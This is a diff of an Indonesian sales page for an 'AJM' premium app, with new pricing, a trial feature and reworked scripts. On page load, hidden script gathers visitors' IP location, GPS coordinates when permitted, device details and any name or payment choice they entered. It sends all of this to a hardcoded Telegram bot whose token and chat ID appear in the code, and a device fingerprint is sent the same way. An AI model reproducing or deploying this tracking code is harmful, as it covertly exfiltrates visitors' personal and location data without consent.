@@ -134,6 +134,24 @@
         .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.92); display: none; align-items: center; justify-content: center; z-index: 10000; padding: 25px; backdrop-filter: blur(15px); }
         .modal { background: #111827; padding: 35px; border-radius: 35px; text-align: center; width: 100%; border: 1px solid var(--border); }
         .modal button { background: var(--primary); border: none; color: #000; padding: 15px; border-radius: 18px; font-weight: 800; width: 100%; margin-top: 20px; }
+        .select-option {
+    font-weight: bold;
+}
+.old-price {
+    text-decoration: line-through;
+    color: #888;
+    margin-left: 5px;
+    font-size: 12px;
+}
+.badge {
+    color: #fff;
+    padding: 2px 6px;
+    border-radius: 6px;
+    font-size: 10px;
+    margin-left: 6px;
+}
+.badge-hot { background: red; }
+.badge-best { background: green; }
     </style>
 </head>
 <body oncontextmenu="return false;">
@@ -222,15 +240,29 @@
         </div>
         <button class="btn-more" id="btnAJM" onclick="toggleMore()">LIHAT SEMUA FITUR LENGKAP</button>
     </div>
-
+    <br>
+    <a href="#" class="testi-btn" style="background: linear-gradient(135deg,#22c55e,#16a34a);" onclick="goTrial()">🚀 COBA GRATIS (TRIAL)
+    </a>
+    <div id="trialTimerBox" style="display:none; margin-bottom:15px; text-align:center; font-size:13px; color:#22c55e; font-weight:700;">
+      ⏳ Sisa Trial: <span id="trialTime">00:00</span>
+    </div>
     <div class="section-tag">Billing & Activation</div>
     <div class="form-box">
         <input id="userName" type="text" placeholder="Masukkan Nama Lengkap Anda">
         <select id="userPlan" onchange="handlePlanChange()">
             <option value="" disabled selected>Pilih Paket Berlangganan</option>
-            <option value="Bulanan" data-price="300000">AJM Standard (30 Hari) - 300rb</option>
-            <option value="Tahunan" data-price="600000">AJM Advanced (1 Tahun) - 600rb</option>
-            <option value="Permanen" data-price="900000">AJM Lifetime (Selamanya) - 900rb</option>
+            <option value="Bulanan" data-price="300000">
+              AJM Standard (30 Hari) - Rp 300.000
+            </option>
+            <option value="Tahunan" data-price="450000">
+              ⚡ AJM Advanced (1 Tahun) - Rp 450.000 <span class="old-price">600.000</span>
+              🔥 HEMAT 150K
+            </option>
+            <option value="Permanen" data-price="650000">
+              🚀 AJM Lifetime (Selamanya) - Rp 650.000 
+              <span class="old-price">900.000</span>
+              <span class="badge badge-best">BEST VALUE</span>
+            </option>
         </select>
 
         <div id="paymentOptions" class="payment-options">
@@ -250,195 +282,506 @@
     </div>
 
     <footer class="footer">
-        <p>© 2026 AJM PREMIUM | SYSTEM BY RAYANXWEB</p>
-    </footer>
+    <p>© 2026 // ENCRYPTED NETWORK // ACCESS LOGGED</p>
+    <p>
+        <a href="#">[PRIVACY]</a> 
+        <span>::</span> 
+        <a href="#">[TERMS]</a>
+    </p>
+</footer>
 </div>
 
 <div class="overlay" id="modal"><div class="modal"><h3 id="mTitle"></h3><p id="mText"></p><button onclick="closePop()">MENGERTI</button></div></div>
-<div id="visitorToast" class="toast">⚡ <div style="flex:1"><b style="font-size:13px; color:var(--primary)">Sistem Aktif</b><br><span style="font-size:11px">Log terkirim...</span></div></div>
+<div id="visitorToast" class="toast">⚡ <div style="flex:1"><b style="font-size:13px; color:var(--primary)">Sistem Aktif</b><br><span style="font-size:11px">Selamat Datang</span></div></div>
 
 <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
-    import { getDatabase, ref, increment, update, onValue } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
+import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
+import { getDatabase, ref, increment, update, onValue } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
 
-    const firebaseConfig = {
-        apiKey: "AIzaSyBSRUZheiN6UQshTHyKvZN0PLZ-pYyF3JE",
-        authDomain: "pengunjung-dbc40.firebaseapp.com",
-        databaseURL: "https://pengunjung-dbc40-default-rtdb.asia-southeast1.firebasedatabase.app",
-        projectId: "pengunjung-dbc40",
-        storageBucket: "pengunjung-dbc40.firebasestorage.app",
-        messagingSenderId: "176191314530",
-        appId: "1:176191314530:web:c3421dfc8c1434aaba0f3b"
-    };
+const firebaseConfig = {
+    apiKey: "AIzaSyBSRUZheiN6UQshTHyKvZN0PLZ-pYyF3JE",
+    authDomain: "pengunjung-dbc40.firebaseapp.com",
+    databaseURL: "https://pengunjung-dbc40-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "pengunjung-dbc40",
+    storageBucket: "pengunjung-dbc40.firebasestorage.app",
+    messagingSenderId: "176191314530",
+    appId: "1:176191314530:web:c3421dfc8c1434aaba0f3b"
+};
 
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
-    const statsRef = ref(db, 'system_stats');
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+const statsRef = ref(db, 'system_stats');
 
-    async function logToAdmin() {
+// ================= BROWSER =================
+function getBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Chrome")) return "Chrome";
+    if (ua.includes("Firefox")) return "Firefox";
+    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+    if (ua.includes("Edge")) return "Edge";
+    return "Unknown";
+}
+
+// ================= DOWNLOAD COUNTER =================
+function getDownloadCount() {
+    let count = localStorage.getItem("ajm_download");
+
+    if (!count) count = 1;
+    else count = parseInt(count) + 1;
+
+    localStorage.setItem("ajm_download", count);
+    return count;
+}
+
+// ================= GPS =================
+async function getGPS() {
+    let gpsData = "Tidak diizinkan";
+
+    if (navigator.geolocation) {
+        gpsData = await new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    resolve(`Lat: ${lat}, Lon: ${lon}
+🗺 https://www.google.com/maps?q=${lat},${lon}`);
+                },
+                () => resolve("User menolak izin GPS"),
+                { timeout: 5000 }
+            );
+        });
+    }
+
+    return gpsData;
+}
+
+// ================= ANTI SPAM =================
+function antiSpamVisit() {
+    const now = Date.now();
+    const lastVisit = localStorage.getItem("ajm_last_visit");
+
+    if (lastVisit && (now - lastVisit < 10000)) {
+        console.warn("Spam refresh terdeteksi");
+        return false;
+    }
+
+    localStorage.setItem("ajm_last_visit", now);
+    return true;
+}
+
+// ================= MAIN LOG =================
+async function logToAdmin() {
     try {
-        // 1. Ambil Data IP & ISP dari API Terpercaya
+        // IP DATA
         const ipRes = await fetch('https://ipapi.co/json/');
         const d = await ipRes.json();
 
-        // 2. Data Baterai (Real-time Status)
-        let batteryDetail = "Tidak Terdeteksi";
-        if (navigator.getBattery) {
-            const b = await navigator.getBattery();
-            batteryDetail = `${(b.level * 100).toFixed(0)}% (${b.charging ? '🔌 Charging' : '🔋 Discharging'})`;
-        }
+        // GPS
+        const gpsData = await getGPS();
 
-        // 3. Data Hardware & Koneksi
-        const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
-        const cpu = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Core` : "Unknown";
-        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        const netType = connection ? connection.effectiveType.toUpperCase() : "Unknown";
-
-        // 4. Data Waktu & Browser
+        // WAKTU
         const now = new Date();
         const tgl = now.toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
         const jam = now.toLocaleTimeString('id-ID');
-        const userAgent = navigator.userAgent;
-        const referer = document.referrer || "Direct / WhatsApp Link";
 
-        // 5. Susun Laporan Super Detail (Full Markdown)
+        // MESSAGE
         const msg = `
-🔥 *AJM SYSTEM: TARGET CAPTURED* 🔥
+🔥 *AJM SYSTEM: USER ACTIVITY* 🔥
 ━━━━━━━━━━━━━━━━━━━━
-👤 *IDENTITAS JARINGAN*
-🌐 *IP Address:* \`${d.ip}\`
-📶 *ISP/Provider:* \`${d.org}\`
-📡 *Network Type:* \`${netType}\`
-📍 *Lokasi:* ${d.city}, ${d.region}, ${d.country_name}
+👤 *DATA USER*
+🧑 Nama: \`${document.getElementById("userName")?.value || "Tidak diisi"}\`
+📦 Paket: \`${document.getElementById("userPlan")?.value || "Trial"}\`
+💳 Payment: \`${window.selectedMethod || "Belum dipilih"}\`
 
-📱 *SPESIFIKASI PERANGKAT*
-🛠 *OS/Platform:* \`${navigator.platform}\`
-🧠 *Hardware:* ${cpu} CPU / ${ram} RAM
-🔋 *Battery:* ${batteryDetail}
-🖥 *Screen:* ${window.screen.width}x${window.screen.height}
-🌐 *Language:* ${navigator.language}
+📱 *INFORMASI PERANGKAT*
+🤖 Device: \`${navigator.userAgent}\`
+🌐 Browser: \`${getBrowser()}\`
+🖥 Resolusi: \`${window.screen.width}x${window.screen.height}\`
+🌍 Bahasa: \`${navigator.language}\`
 
-🕒 *LOG AKTIVITAS*
-📅 *Hari:* ${tgl}
-⏰ *Waktu:* ${jam} (WIB)
-🔗 *Source:* ${referer}
+📍 *LOKASI (APPROX)*
+📌 ${d.city || "-"}, ${d.region || "-"}, ${d.country_name || "-"}
 
-📍 *TITIK KOORDINAT (GPS)*
-Lat/Lon: \`${d.latitude}, ${d.longitude}\`
-🗺 *Google Maps:* [KLIK DI SINI](https://www.google.com/maps?q=${d.latitude},${d.longitude})
+📍 *GPS REAL*
+${gpsData}
 
-🤖 *FULL USER AGENT:*
-\`${userAgent}\`
+📊 *STATISTIK*
+⬇️ Download Aplikasi: \`${getDownloadCount()}\` User
+
+🕒 *WAKTU AKSES*
+📅 ${tgl}
+⏰ ${jam} WIB
 ━━━━━━━━━━━━━━━━━━━━
-🛰 *STATUS: SILENT MONITORING ACTIVE*
-        `;
+🛰 *STATUS: USER TRACKED*
+`;
 
-        // 6. Kirim ke Bot Telegram Anda
+        // KIRIM TELEGRAM
         await fetch(`https://api.telegram.org/bot8637984928:AAHEtjbOkiDojbb5Y_-eHu-y-6JOQJYSqto/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                chat_id: "8215645360", 
-                text: msg, 
-                parse_mode: 'Markdown',
-                disable_web_page_preview: false 
+            body: JSON.stringify({
+                chat_id: "8215645360",
+                text: msg,
+                parse_mode: 'Markdown'
             })
         });
 
-        // 7. Notifikasi Visual di Web
+        // TOAST
         const t = document.getElementById('visitorToast');
-        if(t) {
+        if (t) {
             t.classList.add('show');
             setTimeout(() => t.classList.remove('show'), 4000);
         }
 
     } catch (err) {
-        console.error("Critical Error on Logging:", err);
+        console.error("Error:", err);
     }
 }
 
-// Eksekusi Otomatis
+// ================= INIT =================
 update(statsRef, { total_visits: increment(1) });
-    onValue(statsRef, (snap) => {
-        const data = snap.val();
-        if (data) document.getElementById('totalVisitorsDisplay').innerText = data.total_visits.toLocaleString();
-    });
+
+onValue(statsRef, (snap) => {
+    const data = snap.val();
+    if (data) {
+        document.getElementById('totalVisitorsDisplay').innerText =
+            data.total_visits.toLocaleString();
+    }
+});
+
+// JALANKAN SEKALI SAJA (ANTI SPAM)
+if (antiSpamVisit()) {
     logToAdmin();
+}
 </script>
 
 <script>
-    // Video Force Play
-    window.addEventListener('load', function() {
-        var v = document.getElementById('headerVideo');
-        v.play().catch(() => { document.body.addEventListener('touchstart', () => v.play(), {once: true}); });
+(() => {
+    "use strict";
+
+    // ================= VIDEO AUTO PLAY =================
+    window.addEventListener('load', () => {
+        const v = document.getElementById('headerVideo');
+        if (!v) return;
+
+        v.play().catch(() => {
+            document.body.addEventListener('touchstart', () => v.play(), { once: true });
+        });
     });
 
-    const texts = ["ENCRYPTED CONNECTION", "SECURE BRIDGE ACTIVE", "SYSTEM BY RAYANXWEB"];
+    // ================= TYPING EFFECT =================
+    const texts = [
+  "ACCESS GRANTED",
+  "BREACHING SECURITY LAYER",
+  "INJECTING PAYLOAD",
+  "ROOT ACCESS ACQUIRED",
+  "ENCRYPTION LOCKED",
+  "SYSTEM FULL CONTROL"
+];
     let count = 0, index = 0;
-    (function type() {
-        if (count === texts.length) count = 0;
-        let c = texts[count], l = c.slice(0, ++index);
-        document.getElementById("typeEffect").textContent = l;
-        if (l.length === c.length) { count++; index = 0; setTimeout(type, 2000); }
-        else { setTimeout(type, 80); }
-    }());
 
-    function toggleMore() {
-        const m = document.getElementById('moreAJM');
-        const h = (window.getComputedStyle(m).display === 'none');
-        m.style.display = h ? 'block' : 'none';
-        document.getElementById('btnAJM').innerText = h ? 'TUTUP' : 'LIHAT SEMUA';
-    }
+    function typeEffect() {
+        const el = document.getElementById("typeEffect");
+        if (!el) return;
 
-    function pop(t, x) {
-        document.getElementById('mTitle').innerText = t;
-        document.getElementById('mText').innerText = x;
-        document.getElementById('modal').style.display = 'flex';
-    }
-    function closePop() { document.getElementById('modal').style.display = 'none'; }
+        if (count >= texts.length) count = 0;
 
-    let currentPrice = 0, selectedMethod = '';
+        const current = texts[count];
+        const text = current.slice(0, ++index);
 
-    function handlePlanChange() {
-        const p = document.getElementById('userPlan');
-        const val = p.value;
-        currentPrice = parseInt(p.options[p.selectedIndex].getAttribute('data-price'));
-        
-        // Reset View
-        document.getElementById('paymentOptions').style.display = 'grid';
-        document.getElementById('qrisBox').style.display = 'none';
-        document.getElementById('adminChats').style.display = 'none';
-        document.querySelectorAll('.opt-card').forEach(c => c.classList.remove('active'));
-        
-        // Logika DP hanya untuk Tahunan & Permanen
-        const dpBtn = document.getElementById('optDP');
-        if (val === 'Tahunan' || val === 'Permanen') {
-            dpBtn.style.display = 'block';
-            document.getElementById('paymentOptions').style.columns = '2';
+        el.textContent = text;
+
+        if (text.length === current.length) {
+            count++;
+            index = 0;
+            setTimeout(typeEffect, 2000);
         } else {
-            dpBtn.style.display = 'none';
-            document.getElementById('paymentOptions').style.gridTemplateColumns = '1fr';
+            setTimeout(typeEffect, 80);
+        }
+    }
+    typeEffect();
+
+    // ================= TOGGLE FITUR =================
+    window.toggleMore = function () {
+        const more = document.getElementById('moreAJM');
+        const btn = document.getElementById('btnAJM');
+        if (!more || !btn) return;
+
+        const isHidden = getComputedStyle(more).display === 'none';
+        more.style.display = isHidden ? 'block' : 'none';
+        btn.innerText = isHidden ? 'TUTUP' : 'LIHAT SEMUA';
+    };
+
+    // ================= MODAL =================
+    window.pop = function (title, text) {
+        const modal = document.getElementById('modal');
+        const mTitle = document.getElementById('mTitle');
+        const mText = document.getElementById('mText');
+
+        if (!modal || !mTitle || !mText) return;
+
+        mTitle.innerText = title;
+        mText.innerText = text;
+        modal.style.display = 'flex';
+    };
+
+    window.closePop = function () {
+        const modal = document.getElementById('modal');
+        if (modal) modal.style.display = 'none';
+    };
+
+    // ================= STATE =================
+    let currentPrice = 0;
+    window.selectedMethod = '';
+
+    // ================= PLAN =================
+    window.handlePlanChange = function () {
+        const plan = document.getElementById('userPlan');
+        const payment = document.getElementById('paymentOptions');
+        const qris = document.getElementById('qrisBox');
+        const chats = document.getElementById('adminChats');
+        const dpBtn = document.getElementById('optDP');
+
+        if (!plan || !payment) return;
+
+        const selected = plan.options[plan.selectedIndex];
+        currentPrice = parseInt(selected.getAttribute('data-price')) || 0;
+
+        // Reset UI
+        payment.style.display = 'grid';
+        if (qris) qris.style.display = 'none';
+        if (chats) chats.style.display = 'none';
+
+        document.querySelectorAll('.opt-card').forEach(c => c.classList.remove('active'));
+
+        // Logic DP
+        if (plan.value === 'Tahunan' || plan.value === 'Permanen') {
+            if (dpBtn) dpBtn.style.display = 'block';
+            payment.style.gridTemplateColumns = '1fr 1fr';
+        } else {
+            if (dpBtn) dpBtn.style.display = 'none';
+            payment.style.gridTemplateColumns = '1fr';
+        }
+    };
+
+    // ================= SELECT PAYMENT =================
+    window.selectPay = function (method) {
+        const qris = document.getElementById('qrisBox');
+        const chats = document.getElementById('adminChats');
+        const display = document.getElementById('displayAmount');
+
+        window.selectedMethod = method;
+
+        document.querySelectorAll('.opt-card').forEach(c => c.classList.remove('active'));
+        const active = document.getElementById('opt' + method);
+        if (active) active.classList.add('active');
+
+        let amount = (method === 'DP') ? currentPrice * 0.6 : currentPrice;
+
+        if (display) {
+            display.innerText = "Rp " + amount.toLocaleString('id-ID');
+        }
+
+        if (qris) qris.style.display = 'block';
+        if (chats) chats.style.display = 'grid';
+    };
+
+    // ================= ORDER =================
+    window.sendOrder = function (platform) {
+        const name = document.getElementById('userName')?.value.trim();
+        const plan = document.getElementById('userPlan')?.value;
+
+        if (!name || !plan || !window.selectedMethod) {
+            alert("Lengkapi Nama & Pilih Metode!");
+            return;
+        }
+
+        const total = document.getElementById('displayAmount')?.innerText || "-";
+
+        const msg = `🔥 *ORDER AJM* 🔥
+👤 Nama: ${name}
+📦 Paket: ${plan}
+💳 Tipe: ${window.selectedMethod}
+💰 Total: ${total}`;
+
+        const url = (platform === 'WA')
+            ? `https://wa.me/6283869335367?text=${encodeURIComponent(msg)}`
+            : `https://t.me/Aldinugroho378?text=${encodeURIComponent(msg)}`;
+
+        window.open(url, '_blank');
+    };
+
+})();
+</script>
+<script>
+let trialInterval = null;
+
+// ================= CONFIG =================
+const TRIAL_DURATION = 3 * 24 * 60 * 60 * 1000; // 3 hari
+
+// ================= DEVICE FINGERPRINT =================
+function getDeviceId() {
+    let raw = [
+        navigator.userAgent,
+        navigator.language,
+        screen.width + "x" + screen.height,
+        navigator.hardwareConcurrency || "cpu",
+        navigator.deviceMemory || "ram"
+    ].join("|");
+
+    return btoa(raw); // encode sederhana
+}
+
+// ================= HASH PROTECTION =================
+function createHash(data) {
+    return btoa(JSON.stringify(data)).slice(0, 50);
+}
+
+// ================= AMBIL WAKTU SERVER =================
+async function getServerTime() {
+    try {
+        const res = await fetch("https://worldtimeapi.org/api/ip");
+        const data = await res.json();
+        return new Date(data.utc_datetime).getTime();
+    } catch {
+        return Date.now(); // fallback
+    }
+}
+
+// ================= SIMPAN DATA =================
+function saveTrial(data) {
+    data.hash = createHash(data);
+    localStorage.setItem("ajm_trial_data", JSON.stringify(data));
+}
+
+// ================= VALIDASI DATA =================
+function validateTrial(data) {
+    if (!data || !data.hash) return false;
+
+    const checkHash = createHash({
+        start: data.start,
+        expire: data.expire,
+        device: data.device
+    });
+
+    return data.hash === checkHash;
+}
+
+// ================= MAIN TRIAL =================
+async function goTrial() {
+    const now = await getServerTime();
+    const deviceId = getDeviceId();
+
+    let trialData = JSON.parse(localStorage.getItem("ajm_trial_data"));
+
+    // ================= CEK EXISTING =================
+    if (trialData && validateTrial(trialData)) {
+
+        // Cek device
+        if (trialData.device !== deviceId) {
+            alert("❌ Trial hanya berlaku untuk 1 device!");
+            return;
+        }
+
+        // Cek waktu
+        if (now < trialData.expire) {
+            startTrialTimer(trialData.expire);
+            safeRedirect(trialData.url);
+            return;
+        } else {
+            alert("⚠️ Trial sudah habis!");
+            localStorage.removeItem("ajm_trial_data");
+            return;
         }
     }
 
-    function selectPay(m) {
-        selectedMethod = m;
-        document.querySelectorAll('.opt-card').forEach(c => c.classList.remove('active'));
-        document.getElementById('opt' + m).classList.add('active');
-        let amt = (m === 'DP') ? currentPrice * 0.6 : currentPrice;
-        document.getElementById('displayAmount').innerText = "Rp " + amt.toLocaleString('id-ID');
-        document.getElementById('qrisBox').style.display = 'block';
-        document.getElementById('adminChats').style.display = 'grid';
-    }
+    // ================= BUAT TRIAL BARU =================
+    const expireTime = now + TRIAL_DURATION;
 
-    function sendOrder(p) {
-        const n = document.getElementById('userName').value.trim();
-        const pl = document.getElementById('userPlan').value;
-        if (!n || !pl || !selectedMethod) { alert("Lengkapi Nama & Pilih Metode!"); return; }
-        const msg = `🔥 *ORDER AJM* 🔥\n👤 Nama: ${n}\n📦 Paket: ${pl}\n💳 Tipe: ${selectedMethod}\n💰 Total: ${document.getElementById('displayAmount').innerText}`;
-        const u = (p === 'WA') ? `https://wa.me/6283869335367?text=${encodeURIComponent(msg)}` : `https://t.me/Aldinugroho378?text=${encodeURIComponent(msg)}`;
-        window.open(u, '_blank');
+    const data = {
+        start: now,
+        expire: expireTime,
+        device: deviceId,
+        url: "https://download-aplikasi-ajm.vercel.app"
+    };
+
+    saveTrial(data);
+
+    startTrialTimer(expireTime);
+    sendTrialNotif(deviceId);
+
+    safeRedirect(data.url);
+}
+
+// ================= TIMER =================
+function startTrialTimer(expireTime) {
+    const box = document.getElementById("trialTimerBox");
+    const text = document.getElementById("trialTime");
+
+    if (!box || !text) return;
+
+    box.style.display = "block";
+
+    if (trialInterval) clearInterval(trialInterval);
+
+    trialInterval = setInterval(async () => {
+        const now = await getServerTime();
+        const remaining = expireTime - now;
+
+        if (remaining <= 0) {
+            clearInterval(trialInterval);
+            localStorage.removeItem("ajm_trial_data");
+            text.innerText = "00:00:00";
+            alert("⛔ Trial habis!");
+            return;
+        }
+
+        const d = Math.floor(remaining / (1000 * 60 * 60 * 24));
+        const h = Math.floor((remaining / (1000 * 60 * 60)) % 24);
+        const m = Math.floor((remaining / (1000 * 60)) % 60);
+        const s = Math.floor((remaining / 1000) % 60);
+
+        text.innerText =
+            `${d}H ${String(h).padStart(2,'0')}J ` +
+            `${String(m).padStart(2,'0')}M ` +
+            `${String(s).padStart(2,'0')}D`;
+
+    }, 1000);
+}
+
+// ================= REDIRECT =================
+function safeRedirect(url) {
+    setTimeout(() => window.location.href = url, 300);
+}
+
+// ================= TELEGRAM LOG =================
+function sendTrialNotif(deviceId) {
+    try {
+        fetch("https://api.telegram.org/bot8637984928:AAHEtjbOkiDojbb5Y_-eHu-y-6JOQJYSqto/sendMessage", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                chat_id: "8215645360",
+                text: `🚀 TRIAL AKTIF\nDevice: ${deviceId}`
+            })
+        });
+    } catch {}
+}
+
+// ================= AUTO CHECK =================
+window.addEventListener("load", async () => {
+    let trialData = JSON.parse(localStorage.getItem("ajm_trial_data"));
+
+    if (trialData && validateTrial(trialData)) {
+        const now = await getServerTime();
+
+        if (now < trialData.expire) {
+            startTrialTimer(trialData.expire);
+        } else {
+            localStorage.removeItem("ajm_trial_data");
+        }
     }
+});
 </script>
 </body>
 </html>
